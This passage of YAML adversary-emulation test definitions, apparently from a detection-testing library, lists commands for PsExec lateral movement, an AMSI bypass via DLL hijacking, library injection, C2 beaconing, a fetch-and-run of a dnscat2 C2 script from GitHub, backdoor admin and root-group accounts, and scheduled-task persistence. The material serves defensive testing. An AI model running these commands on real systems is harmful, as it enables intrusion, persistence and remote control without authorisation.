      psexec.py '#{domain}/#{username}:#{password}@#{remote_host}' '#{command}'
    name: bash
- name: BlackCat pre-encryption cmds with Lateral Movement
  auto_generated_guid: 31eb7828-97d7-4067-9c1e-c6feb85edc4b
  description: This atomic attempts to emulate the unique behavior of BlackCat ransomware prior to encryption and during Lateral Movement attempts via PsExec on Windows. Uses bundled PsExec like BlackCat
  supported_platforms:
  - windows
  input_arguments:
    targethost:
      description: Target hostname to attempt psexec connection to for emulation of lateral movement.
      type: string
      default: $ENV:COMPUTERNAME
  executor:
    command: |
      cmd.exe /c "wmic 	csproduct 	get UUID" 
      cmd.exe /c "fsutil behavior 	set SymlinkEvaluation R2L:1" 
      cmd.exe /c "fsutil behavior set 	SymlinkEvaluation R2R:1"
      reg    add    HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters    /v MaxMpxCt /d 65535 /t REG_DWORD /f      
      copy $pathtoatomicsfolder\T1569.002\bin\PsExec.exe $env:temp
      cmd.exe /c "$env:temp\psexec.exe  -accepteula  \\#{targethost} cmd.exe  /c echo "--access-token""
    cleanup_command: |
      reg delete HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters /v MaxMpxCt /f
      cmd.exe /c "fsutil behavior set SymlinkEvaluation R2L:0" 
      cmd.exe /c "fsutil behavior set SymlinkEvaluation R2R:0"
      rm $env:temp\psexec.exe
    name: powershell
    elevation_required: true



- name: DLL Search Order Hijacking - amsi.dll
  auto_generated_guid: 8549ad4b-b5df-4a2d-a3d7-2aee9e7052a3
  description: |
    Adversaries can take advantage of insecure library loading by PowerShell to load a vulnerable version of amsi.dll in order to bypass AMSI (Anti-Malware Scanning Interface)
    https://enigma0x3.net/2017/07/19/bypassing-amsi-via-com-server-hijacking/

    Upon successful execution, powershell.exe will be copied and renamed to updater.exe and load amsi.dll from a non-standard path.
  supported_platforms:
  - windows
  executor:
    command: |
      copy %windir%\System32\windowspowershell\v1.0\powershell.exe %APPDATA%\updater.exe
      copy %windir%\System32\amsi.dll %APPDATA%\amsi.dll
      %APPDATA%\updater.exe -Command exit
    cleanup_command: |
      del %APPDATA%\updater.exe >nul 2>&1
      del %APPDATA%\amsi.dll >nul 2>&1
    name: command_prompt
    elevation_required: true
    
    
    
- name: DLL Side-Loading using the Notepad++ GUP.exe binary
  auto_generated_guid: 65526037-7079-44a9-bda1-2cb624838040
  description: |
    GUP is an open source signed binary used by Notepad++ for software updates, and is vulnerable to DLL Side-Loading, thus enabling the libcurl dll to be loaded.
    Upon execution, calc.exe will be opened.
  supported_platforms:
  - windows
  input_arguments:
    process_name:
      description: Name of the created process
      type: String
      default: calculator.exe
    gup_executable:
      description: GUP is an open source signed binary used by Notepad++ for software updates
      type: Path
      default: PathToAtomicsFolder\T1574.002\bin\GUP.exe
  dependency_executor_name: powershell
  dependencies:
  - description: |
      Gup.exe binary must exist on disk at specified location (#{gup_executable})
    prereq_command: |
      if (Test-Path #{gup_executable}) {exit 0} else {exit 1}
    get_prereq_command: |
      New-Item -Type Directory (split-path #{gup_executable}) -ErrorAction ignore | Out-Null
      Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1574.002/bin/GUP.exe?raw=true" -OutFile "#{gup_executable}"
  executor:
    command: |
      #{gup_executable}
    cleanup_command: |
      taskkill /F /IM #{process_name} >nul 2>&1
    name: command_prompt

- name: DLL Side-Loading using the dotnet startup hook environment variable
  auto_generated_guid: d322cdd7-7d60-46e3-9111-648848da7c02
  description: |
    Utilizing the dotnet_startup_hooks environment variable, this method allows for registering a global method in an assembly that will be executed whenever a .net core application is started. This unlocks a whole range of scenarios, from injecting a profiler to tweaking a static context in a given environment. [blog post](https://medium.com/criteo-engineering/c-have-some-fun-with-net-core-startup-hooks-498b9ad001e1)
  supported_platforms:
  - windows
  input_arguments:
    process_name:
      description: Name of the created process
      type: String
      default: calculator.exe
    preloader_dll:
      description: library for interfacing with the dotnet framework
      type: Path
      default: PathToAtomicsFolder\T1574.002\bin\preloader.dll
  dependency_executor_name: powershell
  dependencies:
  - description: |
      .Net SDK must be installed
    prereq_command: |
      if (Test-Path "C:\Program Files\dotnet\dotnet.exe") {exit 0} else {exit 1}
    get_prereq_command: |
      winget install Microsoft.DotNet.SDK.6 --accept-source-agreements --accept-package-agreements -h > $null
      echo.
  - description: |
      preloader must exist
    prereq_command: |
      if (Test-Path "#{preloader_dll}") {exit 0} else {exit 1}
    get_prereq_command: |
      Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1574.002/bin/preloader?raw=true" -OutFile "#{preloader_dll}"
  executor:
    command: |
      set DOTNET_STARTUP_HOOKS=#{preloader_dll}
      dotnet -h > nul
      echo.
    cleanup_command: |
      taskkill /F /IM #{process_name} >nul 2>&1
    name: command_prompt



- name: Shared Library Injection via /etc/ld.so.preload
  auto_generated_guid: 39cb0e67-dd0d-4b74-a74b-c072db7ae991
  description: |
    This test adds a shared library to the `ld.so.preload` list to execute and intercept API calls. This technique was used by threat actor Rocke during the exploitation of Linux web servers. This requires the `glibc` package.

    Upon successful execution, bash will echo `../bin/T1574.006.so` to /etc/ld.so.preload. 
  supported_platforms:
  - linux
  input_arguments:
    path_to_shared_library_source:
      description: Path to a shared library source code
      type: Path
      default: PathToAtomicsFolder/T1574.006/src/Linux/T1574.006.c
    path_to_shared_library:
      description: Path to a shared library object
      type: Path
      default: /tmp/T1574006.so
  dependency_executor_name: bash
  dependencies:
  - description: |
      The shared library must exist on disk at specified location (#{path_to_shared_library})
    prereq_command: |
      if [ -f #{path_to_shared_library} ]; then exit 0; else exit 1; fi;
    get_prereq_command: |      
      gcc -shared -fPIC -o #{path_to_shared_library} #{path_to_shared_library_source}
  executor:
    command: |
      sudo sh -c 'echo #{path_to_shared_library} > /etc/ld.so.preload'
    cleanup_command: |
      sudo sed -i 's##{path_to_shared_library}##' /etc/ld.so.preload
    name: bash
    elevation_required: true
- name: Shared Library Injection via LD_PRELOAD
  auto_generated_guid: bc219ff7-789f-4d51-9142-ecae3397deae
  description: |
    This test injects a shared object library via the LD_PRELOAD environment variable to execute. This technique was used by threat actor Rocke during the exploitation of Linux web servers. This requires the `glibc` package.

    Upon successful execution, bash will utilize LD_PRELOAD to load the shared object library `/etc/ld.so.preload`. Output will be via stdout.
  supported_platforms:
  - linux
  input_arguments:
    path_to_shared_library_source:
      description: Path to a shared library source code
      type: Path
      default: PathToAtomicsFolder/T1574.006/src/Linux/T1574.006.c
    path_to_shared_library:
      description: Path to a shared library object
      type: Path
      default: /tmp/T1574006.so
  dependency_executor_name: bash
  dependencies:
  - description: |
      The shared library must exist on disk at specified location (#{path_to_shared_library})
    prereq_command: |
      if [ -f #{path_to_shared_library} ]; then exit 0; else exit 1; fi;
    get_prereq_command: |
      gcc -shared -fPIC -o #{path_to_shared_library} #{path_to_shared_library_source}
  executor:
    command: |
      LD_PRELOAD=#{path_to_shared_library} ls
    name: bash
- name: Dylib Injection via DYLD_INSERT_LIBRARIES
  auto_generated_guid: 4d66029d-7355-43fd-93a4-b63ba92ea1be
  description: |
    injects a dylib that opens calculator via env variable
  supported_platforms:
  - macos
  input_arguments:
    file_to_inject:
      description: Path of executable to be injected. Mostly works on non-apple default apps.
      type: Path
      default: /Applications/Firefox.app/Contents/MacOS/firefox
    source_file:
      description: Path of c source file
      type: Path
      default: PathToAtomicsFolder/T1574.006/src/MacOS/T1574.006.c
    dylib_file:
      description: Path of dylib file
      type: Path
      default: /tmp/T1574006MOS.dylib
  dependency_executor_name: bash
  dependencies:
  - description: |
      Compile the dylib from (#{source_file}). Destination is #{dylib_file}
    prereq_command: |
      gcc -dynamiclib #{source_file} -o #{dylib_file}
    get_prereq_command: |
      gcc -dynamiclib #{source_file} -o #{dylib_file}
  executor:
    command: |
      DYLD_INSERT_LIBRARIES=#{dylib_file} #{file_to_inject}
    cleanup_command: |
      kill `pgrep Calculator`
      kill `pgrep firefox`
    name: bash
    elevation_required: false



- name: Malicious User Agents - Powershell
  auto_generated_guid: 81c13829-f6c9-45b8-85a6-053366d55297
  description: |
    This test simulates an infected host beaconing to command and control. Upon execution, no output will be displayed. 
    Use an application such as Wireshark to record the session and observe user agent strings and responses.

    Inspired by APTSimulator - https://github.com/NextronSystems/APTSimulator/blob/master/test-sets/command-and-control/malicious-user-agents.bat
  supported_platforms:
  - windows
  input_arguments:
    domain:
      description: Default domain to simulate against
      type: String
      default: www.google.com
  executor:
    command: |
      Invoke-WebRequest #{domain} -UserAgent "HttpBrowser/1.0" | out-null
      Invoke-WebRequest #{domain} -UserAgent "Wget/1.9+cvs-stable (Red Hat modified)" | out-null
      Invoke-WebRequest #{domain} -UserAgent "Opera/8.81 (Windows NT 6.0; U; en)" | out-null
      Invoke-WebRequest #{domain} -UserAgent "*<|>*" | out-null
    name: powershell
- name: Malicious User Agents - CMD
  auto_generated_guid: dc3488b0-08c7-4fea-b585-905c83b48180
  description: |
    This test simulates an infected host beaconing to command and control. Upon execution, no out put will be displayed. 
    Use an application such as Wireshark to record the session and observe user agent strings and responses.

    Inspired by APTSimulator - https://github.com/NextronSystems/APTSimulator/blob/master/test-sets/command-and-control/malicious-user-agents.bat
  supported_platforms:
  - windows
  input_arguments:
    domain:
      description: Default domain to simulate against
      type: String
      default: www.google.com
    curl_path:
      description: path to curl.exe
      type: Path
      default: C:\Windows\System32\Curl.exe
  dependency_executor_name: powershell 
  dependencies: 
    - description: |
        Curl must be installed on system 
      prereq_command: |
        if (Test-Path #{curl_path}) {exit 0} else {exit 1}
      get_prereq_command: |
        Invoke-WebRequest "https://curl.haxx.se/windows/dl-7.71.1/curl-7.71.1-win32-mingw.zip" -Outfile $env:temp\curl.zip
        Expand-Archive -Path $env:temp\curl.zip -DestinationPath $env:temp\curl
        Copy-Item $env:temp\curl\curl-7.71.1-win32-mingw\bin\curl.exe #{curl_path}
        Remove-Item $env:temp\curl
        Remove-Item $env:temp\curl.zip
  executor:
    command: |
      #{curl_path} -s -A "HttpBrowser/1.0" -m3 #{domain} >nul 2>&1
      #{curl_path} -s -A "Wget/1.9+cvs-stable (Red Hat modified)" -m3 #{domain} >nul 2>&1
      #{curl_path} -s -A "Opera/8.81 (Windows NT 6.0; U; en)" -m3 #{domain} >nul 2>&1
      #{curl_path} -s -A "*<|>*" -m3 #{domain} >nul 2>&1
    name: command_prompt
- name: Malicious User Agents - Nix
  auto_generated_guid: 2d7c471a-e887-4b78-b0dc-b0df1f2e0658
  description: |
    This test simulates an infected host beaconing to command and control.
    Inspired by APTSimulator - https://github.com/NextronSystems/APTSimulator/blob/master/test-sets/command-and-control/malicious-user-agents.bat
  supported_platforms:
  - linux
  - macos
  input_arguments:
    domain:
      description: Default domain to simulate against
      type: String
      default: www.google.com
  executor:
    command: |
      curl -s -A "HttpBrowser/1.0" -m3 #{domain}
      curl -s -A "Wget/1.9+cvs-stable (Red Hat modified)" -m3 #{domain}
      curl -s -A "Opera/8.81 (Windows NT 6.0; U; en)" -m3 #{domain}
      curl -s -A "*<|>*" -m3 #{domain}
    name: sh



- name: DNS Large Query Volume
  auto_generated_guid: 1700f5d6-5a44-487b-84de-bc66f507b0a6
  description: |
    This test simulates an infected host sending a large volume of DNS queries to a command and control server.
    The intent of this test is to trigger threshold based detection on the number of DNS queries either from a single source system or to a single targe domain.
    A custom domain and sub-domain will need to be passed as input parameters for this test to work. Upon execution, DNS information about the domain will be displayed for each callout.
  supported_platforms:
  - windows
  input_arguments:
    query_type:
      description: DNS query type
      type: String
      default: TXT
    subdomain:
      description: Subdomain prepended to the domain name
      type: String
      default: atomicredteam
    query_volume:
      description: Number of DNS queries to send
      type: Integer
      default: 1000
    domain:
      description: Default domain to simulate against
      type: String
      default: 127.0.0.1.xip.io
  executor:
    command: |
      for($i=0; $i -le #{query_volume}; $i++) { Resolve-DnsName -type "#{query_type}" "#{subdomain}.$(Get-Random -Minimum 1 -Maximum 999999).#{domain}" -QuickTimeout}
    name: powershell
- name: DNS Regular Beaconing
  auto_generated_guid: 3efc144e-1af8-46bb-8ca2-1376bb6db8b6
  description: |
    This test simulates an infected host beaconing via DNS queries to a command and control server at regular intervals over time.
    This behaviour is typical of implants either in an idle state waiting for instructions or configured to use a low query volume over time to evade threshold based detection.
    A custom domain and sub-domain will need to be passed as input parameters for this test to work. Upon execution, DNS information about the domain will be displayed for each callout.
  supported_platforms:
  - windows
  input_arguments:
    runtime:
      description: Time in minutes to run the simulation
      type: Integer
      default: 30
    domain:
      description: Default domain to simulate against
      type: String
      default: 127.0.0.1.xip.io
    subdomain:
      description: Subdomain prepended to the domain name
      type: String
      default: atomicredteam
    query_type:
      description: DNS query type
      type: String
      default: TXT
    c2_interval:
      description: Seconds between C2 requests to the command and control server
      type: Integer
      default: 30
    c2_jitter:
      description: Percentage of jitter to add to the C2 interval to create variance in the times between C2 requests
      type: Integer
      default: 20
  executor:
    command: |
      Set-Location PathToAtomicsFolder
      .\T1071.004\src\T1071-dns-beacon.ps1 -Domain #{domain} -Subdomain #{subdomain} -QueryType #{query_type} -C2Interval #{c2_interval} -C2Jitter #{c2_jitter} -RunTime #{runtime}
    name: powershell
- name: DNS Long Domain Query
  auto_generated_guid: fef31710-223a-40ee-8462-a396d6b66978
  description: |
    This test simulates an infected host returning data to a command and control server using long domain names.
    The simulation involves sending DNS queries that gradually increase in length until reaching the maximum length. The intent is to test the effectiveness of detection of DNS queries for long domain names over a set threshold.
     Upon execution, DNS information about the domain will be displayed for each callout.
  supported_platforms:
  - windows
  input_arguments:
    query_type:
      description: DNS query type
      type: String
      default: TXT
    subdomain:
      description: Subdomain prepended to the domain name (should be 63 characters to test maximum length)
      type: String
      default: atomicredteamatomicredteamatomicredteamatomicredteamatomicredte
    domain:
      description: Default domain to simulate against
      type: String
      default: 127.0.0.1.xip.io
  executor:
    command: |
      Set-Location PathToAtomicsFolder
      .\T1071.004\src\T1071-dns-domain-length.ps1 -Domain #{domain} -Subdomain #{subdomain} -QueryType #{query_type}
    name: powershell
- name: DNS C2
  auto_generated_guid: e7bf9802-2e78-4db9-93b5-181b7bcd37d7
  description: |
    This will attempt to start a C2 session using the DNS protocol. You will need to have a listener set up and create DNS records prior to executing this command.
    The following blogs have more information.

    https://github.com/iagox86/dnscat2

    https://github.com/lukebaggett/dnscat2-powershell
  supported_platforms:
  - windows
  input_arguments:
    domain:
      description: Domain Name configured to use DNS Server where your C2 listener is running
      type: String
      default: example.com
    server_ip:
      description: IP address of DNS server where your C2 listener is running
      type: String
      default: 127.0.0.1
  executor:
    command: |
      IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/45836819b2339f0bb64eaf294f8cc783635e00c6/dnscat2.ps1')
      Start-Dnscat2 -Domain #{domain} -DNSServer #{server_ip}
    name: powershell



- name: Enable Guest account with RDP capability and admin privileges
  auto_generated_guid: 99747561-ed8d-47f2-9c91-1e5fde1ed6e0
  description: |
    After execution the Default Guest account will be enabled (Active) and added to Administrators and Remote Desktop Users Group,
    and desktop will allow multiple RDP connections.
  supported_platforms:
  - windows
  input_arguments:
    guest_user:
      description: Specify the guest account
      type: String
      default: guest
    guest_password:
      description: Specify the guest password
      type: String
      default: Password123!
    local_admin_group:
      description: Specify the admin localgroup name
      type: String
      default: Administrators
    remote_desktop_users_group_name:
      description: Specify the remote desktop users group name
      type: String
      default: Remote Desktop Users
    remove_rdp_access_during_cleanup:
      description: Set to 1 if you want the cleanup to remove RDP access to machine
      type: Integer
      default: 0
  executor:
    command: |-
      net user #{guest_user} /active:yes
      net user #{guest_user} #{guest_password}
      net localgroup #{local_admin_group} #{guest_user} /add
      net localgroup "#{remote_desktop_users_group_name}" #{guest_user} /add
      reg add "hklm\system\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
      reg add "hklm\system\CurrentControlSet\Control\Terminal Server" /v "AllowTSConnections" /t REG_DWORD /d 0x1 /f
    cleanup_command: |-
      net user #{guest_user} /active:no >nul 2>&1
      net localgroup #{local_admin_group} #{guest_user} /delete >nul 2>&1
      net localgroup "#{remote_desktop_users_group_name}" #{guest_user} /delete >nul 2>&1
      if #{remove_rdp_access_during_cleanup} NEQ 1 (echo Note: set remove_rdp_access_during_cleanup input argument to disable RDP access during cleanup)
      if #{remove_rdp_access_during_cleanup} EQU 1 (reg delete "hklm\system\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /f >nul 2>&1)
      if #{remove_rdp_access_during_cleanup} EQU 1 (reg delete "hklm\system\CurrentControlSet\Control\Terminal Server" /v "AllowTSConnections" /f >nul 2>&1)
    name: command_prompt
    elevation_required: true

- name: Activate Guest Account
  auto_generated_guid: aa6cb8c4-b582-4f8e-b677-37733914abda
  description: |
    The Adversaries can activate the default Guest user. The guest account is inactivated by default
  supported_platforms:
  - windows
  input_arguments:
    guest_user:
      description: Specify the guest account
      type: String
      default: guest
  executor:
    command: |
     net user #{guest_user} /active:yes
    cleanup_command: |
     net user #{guest_user} /active:no
    name: command_prompt
    elevation_required: true



- name: File and Directory Discovery (cmd.exe)
  auto_generated_guid: 0e36303b-6762-4500-b003-127743b80ba6
  description: |
    Find or discover files on the file system.  Upon successful execution, this test will output the results of all the data discovery commands to a specified file.
  supported_platforms:
  - windows
  input_arguments:
    output_file:
        description: File to output results to
        type: String
        default: '%temp%\T1083Test1.txt'
  executor:
    command: |
      dir /s c:\ >> #{output_file}
      dir /s "c:\Documents and Settings" >> #{output_file}
      dir /s "c:\Program Files\" >> #{output_file}
      dir "%systemdrive%\Users\*.*" >> #{output_file}
      dir "%userprofile%\AppData\Roaming\Microsoft\Windows\Recent\*.*" >> #{output_file}
      dir "%userprofile%\Desktop\*.*" >> #{output_file}
      tree /F >> #{output_file}
    cleanup_command: |
      del #{output_file}
    name: command_prompt
- name: File and Directory Discovery (PowerShell)
  auto_generated_guid: 2158908e-b7ef-4c21-8a83-3ce4dd05a924
  description: |
    Find or discover files on the file system. Upon execution, file and folder information will be displayed.
  supported_platforms:
  - windows
  executor:
    command: |
      ls -recurse
      get-childitem -recurse
      gci -recurse
    name: powershell
- name: Nix File and Directory Discovery
  auto_generated_guid: ffc8b249-372a-4b74-adcd-e4c0430842de
  description: |
    Find or discover files on the file system

    References:

    http://osxdaily.com/2013/01/29/list-all-files-subdirectory-contents-recursively/

    https://perishablepress.com/list-files-folders-recursively-terminal/
  supported_platforms:
  - macos
  - linux
  input_arguments:
    output_file:
      description: Output file used to store the results.
      type: Path
      default: /tmp/T1083.txt
  executor:
    command: |
      ls -a >> #{output_file}
      if [ -d /Library/Preferences/ ]; then ls -la /Library/Preferences/ > #{output_file}; fi;
      file */* *>> #{output_file}
      cat #{output_file} 2>/dev/null
      find . -type f
      ls -R | grep ":$" | sed -e 's/:$//' -e 's/[^-][^\/]*\//--/g' -e 's/^/ /' -e 's/-/|/'
      locate *
      which sh
    cleanup_command: |
      rm #{output_file}
    name: sh
- name: Nix File and Directory Discovery 2
  auto_generated_guid: 13c5e1ae-605b-46c4-a79f-db28c77ff24e
  description: |
    Find or discover files on the file system
  supported_platforms:
  - macos
  - linux
  input_arguments:
    output_file:
      description: Output file used to store the results.
      type: Path
      default: /tmp/T1083.txt
  executor:
    command: |
      cd $HOME && find . -print | sed -e 's;[^/]*/;|__;g;s;__|; |;g' > #{output_file}
      if [ -f /etc/mtab ]; then cat /etc/mtab >> #{output_file}; fi;
      find . -type f -iname *.pdf >> #{output_file}
      cat #{output_file}
      find . -type f -name ".*"
    cleanup_command: 'rm #{output_file}'
    name: sh
- name: Simulating MAZE Directory Enumeration
  auto_generated_guid: c6c34f61-1c3e-40fb-8a58-d017d88286d8
  description: |
    This test emulates MAZE ransomware's ability to enumerate directories using Powershell. 
    Upon successful execution, this test will output the directory enumeration results to a specified file, as well as display them in the active window. 
    See https://www.mandiant.com/resources/tactics-techniques-procedures-associated-with-maze-ransomware-incidents
  supported_platforms:
  - windows
  input_arguments:
    File_to_output:
      description: File to output results to
      type: String
      default: $env:temp\T1083Test5.txt
  executor:
    command: |
      $folderarray = @("Desktop", "Downloads", "Documents", "AppData/Local", "AppData/Roaming")
      Get-ChildItem -Path $env:homedrive -ErrorAction SilentlyContinue | Out-File -append #{File_to_output}
      Get-ChildItem -Path $env:programfiles -erroraction silentlycontinue | Out-File -append #{File_to_output}
      Get-ChildItem -Path "${env:ProgramFiles(x86)}" -erroraction silentlycontinue | Out-File -append #{File_to_output}
      $UsersFolder = "$env:homedrive\Users\"
      foreach ($directory in Get-ChildItem -Path $UsersFolder -ErrorAction SilentlyContinue) 
      {
      foreach ($secondarydirectory in $folderarray)
       {Get-ChildItem -Path "$UsersFolder/$directory/$secondarydirectory" -ErrorAction SilentlyContinue | Out-File -append #{File_to_output}}
      }
      cat #{File_to_output}
    cleanup_command: |
      remove-item #{File_to_output} -ErrorAction SilentlyContinue
    name: powershell  
- name: Launch DirLister Executable
  auto_generated_guid: c5bec457-43c9-4a18-9a24-fe151d8971b7
  description: |-
    Launches the DirLister executable for a short period of time and then exits.
    
    Recently seen used by [BlackCat ransomware](https://news.sophos.com/en-us/2022/07/14/blackcat-ransomware-attacks-not-merely-a-byproduct-of-bad-luck/) to create a list of accessible directories and files.
  supported_platforms:
  - windows
  input_arguments:
    dirlister_path:
      description: 'Path to the DirLister executable '
      type: String
      default: PathToAtomicsFolder\T1083\bin\DirLister.exe
  dependency_executor_name: powershell
  dependencies:
  - description: |
      DirLister.exe must exist in the specified path #{dirlister_path}
    prereq_command: |
      if (Test-Path #{dirlister_path}) {exit 0} else {exit 1}
    get_prereq_command: |
      $parentpath = Split-Path "#{dirlister_path}"
      Invoke-WebRequest https://github.com/SanderSade/DirLister/releases/download/v2.beta4/DirLister.v2.beta4.zip -OutFile $env:TEMP\TDirLister.v2.beta4.zip
      New-Item -ItemType Directory -Force -Path $parentpath | Out-Null
      Expand-Archive -Path $env:TEMP\TDirLister.v2.beta4.zip -DestinationPath $env:TEMP\TDirLister.v2.beta4 -Force
      Copy-Item $env:TEMP\TDirLister.v2.beta4\* $parentpath -Recurse
      Remove-Item $env:TEMP\TDirLister.v2.beta4.zip,$env:TEMP\TDirLister.v2.beta4 -Recurse -ErrorAction Ignore
  executor:
    command: |
      Start-Process #{dirlister_path}
      Start-Sleep -Second 4
      Stop-Process -Name "DirLister"
    name: powershell



- name: Connection Proxy
  auto_generated_guid: 0ac21132-4485-4212-a681-349e8a6637cd
  description: |
    Enable traffic redirection.

    Note that this test may conflict with pre-existing system configuration.
  supported_platforms:
  - macos
  - linux
  input_arguments:
    proxy_server:
      description: Proxy server URL (host:port)
      type: Url
      default: 127.0.0.1:8080
    proxy_scheme:
      description: Protocol to proxy (http or https)
      type: String
      default: http
  executor:
    command: |
      export #{proxy_scheme}_proxy=#{proxy_server}
    cleanup_command: |
      unset http_proxy
      unset https_proxy
    name: sh
- name: Connection Proxy for macOS UI
  auto_generated_guid: 648d68c1-8bcd-4486-9abe-71c6655b6a2c
  description: |
    Enable traffic redirection on macOS UI (not terminal).
    The test will modify and enable the "Web Proxy" and "Secure Web Proxy" settings  in System Preferences => Network => Advanced => Proxies for the specified network interface.
    
    Note that this test may conflict with pre-existing system configuration.
  supported_platforms:
    - macos
  input_arguments:
    proxy_server:
      description: Proxy server URL (host)
      type: Url
      default: 127.0.0.1
    proxy_port:
      description: Proxy server port
      type: Integer
      default: 8080
    interface:
      description: Protocol to proxy (http or https)
      type: String
      default: Wi-Fi
  executor:
    name: sh
    command: |
      networksetup -setwebproxy #{interface} #{proxy_server} #{proxy_port}
      networksetup -setsecurewebproxy #{interface} #{proxy_server} #{proxy_port}
    cleanup_command: |
      networksetup -setwebproxystate #{interface} off
      networksetup -setsecurewebproxystate #{interface} off  
- name: portproxy reg key
  auto_generated_guid: b8223ea9-4be2-44a6-b50a-9657a3d4e72a
  description: |
    Adds a registry key to set up a proxy on the endpoint at HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\PortProxy\v4tov4
    Upon execution there will be a new proxy entry in netsh
    netsh interface portproxy show all
  supported_platforms:
  - windows
  input_arguments:
    connectaddress:
      description: Specifies the IPv4 address to which to connect. Acceptable values are IP address, computer NetBIOS name, or computer DNS name. If an address is not specified, the default is the local computer.
      type: String
      default: 127.0.0.1
    connectport:
      description: Specifies the IPv4 port, by port number or service name, to which to connect. If connectport is not specified, the default is the value of listenport on the local computer.
      type: String
      default: "1337"
    listenport:
      description: Specifies the IPv4 port, by port number or service name, on which to listen.
      type: String
      default: "1337"
  executor:
    command: netsh interface portproxy add v4tov4 listenport=#{listenport} connectport=#{connectport} connectaddress=#{connectaddress}
    cleanup_command: netsh interface portproxy delete v4tov4 listenport=#{listenport} -ErrorAction Ignore | Out-Null
    name: powershell
    elevation_required: true



- name: Create a user account on a Linux system
  auto_generated_guid: 40d8eabd-e394-46f6-8785-b9bfa1d011d2
  description: |
    Create a user via useradd
  supported_platforms:
  - linux
  input_arguments:
    username:
      description: Username of the user to create
      type: String
      default: evil_user
  executor:
    command: |
      useradd -M -N -r -s /bin/bash -c evil_account #{username}
    cleanup_command: |
      userdel #{username}
    name: bash
    elevation_required: true
- name: Create a user account on a MacOS system
  auto_generated_guid: 01993ba5-1da3-4e15-a719-b690d4f0f0b2
  description: |
    Creates a user on a MacOS system with dscl
  supported_platforms:
  - macos
  input_arguments:
    username:
      description: Username of the user to create
      type: String
      default: evil_user
    realname:
      description: "'realname' to record when creating the user"
      type: String
      default: Evil Account
  executor:
    command: |
      dscl . -create /Users/#{username}
      dscl . -create /Users/#{username} UserShell /bin/zsh
      dscl . -create /Users/#{username} RealName "#{realname}"
      dscl . -create /Users/#{username} UniqueID "1010"
      dscl . -create /Users/#{username} PrimaryGroupID 80
      dscl . -create /Users/#{username} NFSHomeDirectory /Users/#{username}
    cleanup_command: |
      dscl . -delete /Users/#{username}
    name: bash
    elevation_required: true
- name: Create a new user in a command prompt
  auto_generated_guid: 6657864e-0323-4206-9344-ac9cd7265a4f
  description: |
    Creates a new user in a command prompt. Upon execution, "The command completed successfully." will be displayed. To verify the
    new account, run "net user" in powershell or CMD and observe that there is a new user named "T1136.001_CMD"
  supported_platforms:
  - windows
  input_arguments:
    username:
      description: Username of the user to create
      type: String
      default: T1136.001_CMD
    password:
      description: Password of the user to create
      type: String
      default: T1136.001_CMD!
  executor:
    command: |
      net user /add "#{username}" "#{password}"
    cleanup_command: |
      net user /del "#{username}" >nul 2>&1
    name: command_prompt
    elevation_required: true
- name: Create a new user in PowerShell
  auto_generated_guid: bc8be0ac-475c-4fbf-9b1d-9fffd77afbde
  description: |
    Creates a new user in PowerShell. Upon execution, details about the new account will be displayed in the powershell session. To verify the
    new account, run "net user" in powershell or CMD and observe that there is a new user named "T1136.001_PowerShell"
  supported_platforms:
  - windows
  input_arguments:
    username:
      description: Username of the user to create
      type: String
      default: T1136.001_PowerShell
  executor:
    command: |
      New-LocalUser -Name "#{username}" -NoPassword
    cleanup_command: |
      Remove-LocalUser -Name "#{username}" -ErrorAction Ignore
    name: powershell
    elevation_required: true
- name: Create a new user in Linux with `root` UID and GID.
  auto_generated_guid: a1040a30-d28b-4eda-bd99-bb2861a4616c
  description: |
    Creates a new user in Linux and adds the user to the `root` group. This technique was used by adversaries during the Butter attack campaign.
  supported_platforms:
  - linux
  input_arguments:
    username:
      description: Username of the user to create
      type: String
      default: butter
    password:
      description: Password of the user to create
      type: String
      default: BetterWithButter
  executor:
    command: |
      useradd -g 0 -M -d /root -s /bin/bash #{username}
      if [ $(cat /etc/os-release | grep -i 'Name="ubuntu"') ]; then echo "#{username}:#{password}" | sudo chpasswd; else echo "#{password}" | passwd --stdin #{username}; fi;
    cleanup_command: |
      userdel #{username}
    name: bash
    elevation_required: true
- name: Create a new Windows admin user
  auto_generated_guid: fda74566-a604-4581-a4cc-fbbe21d66559
  description: |
    Creates a new admin user in a command prompt.
  supported_platforms:
  - windows
  input_arguments:
    username:
      description: Username of the user to create
      type: String
      default: T1136.001_Admin
    password:
      description: Password of the user to create
      type: String
      default: T1136_pass
  executor:
    command: |
      net user /add "#{username}" "#{password}"
      net localgroup administrators "#{username}" /add
    cleanup_command: |
      net user /del "#{username}" >nul 2>&1
    name: command_prompt
    elevation_required: true



- name: Octopus Scanner Malware Open Source Supply Chain
  auto_generated_guid: 82a9f001-94c5-495e-9ed5-f530dbded5e2
  description: |
    This test simulates an adversary Octupus drop the RAT dropper ExplorerSync.db
    [octopus-scanner-malware-open-source-supply-chain](https://securitylab.github.com/research/octopus-scanner-malware-open-source-supply-chain/)
    [the-supreme-backdoor-factory](https://www.dfir.it/blog/2019/02/26/the-supreme-backdoor-factory/)
  supported_platforms:
  - windows
  input_arguments:
    rat_payload:
      description: RAT dropper ExplorerSync.db
      type: Path
      default: $env:TEMP\ExplorerSync.db
  dependency_executor_name: powershell
  dependencies:
  - description: |
      ExplorerSync.db must exist on disk at specified location (#{rat_payload})
    prereq_command: |
      if (Test-Path #{rat_payload}) {exit 0} else {exit 1}
    get_prereq_command: |
      Out-File -FilePath "#{rat_payload}"
  executor:
    command: |
      copy %temp%\ExplorerSync.db %temp%\..\Microsoft\ExplorerSync.db
      schtasks /create /tn ExplorerSync /tr "javaw -jar %temp%\..\Microsoft\ExplorerSync.db" /sc MINUTE /f
    cleanup_command: |
      schtasks /delete /tn ExplorerSync /F 2>null
      del %temp%\..\Microsoft\ExplorerSync.db 2>null
      del %temp%\ExplorerSync.db 2>null
    name: command_prompt



- name: Bitsadmin Download (cmd)
  auto_generated_guid: 3c73d728-75fb-4180-a12f-6712864d7421
  description: |
    This test simulates an adversary leveraging bitsadmin.exe to download
    and execute a payload
  supported_platforms:
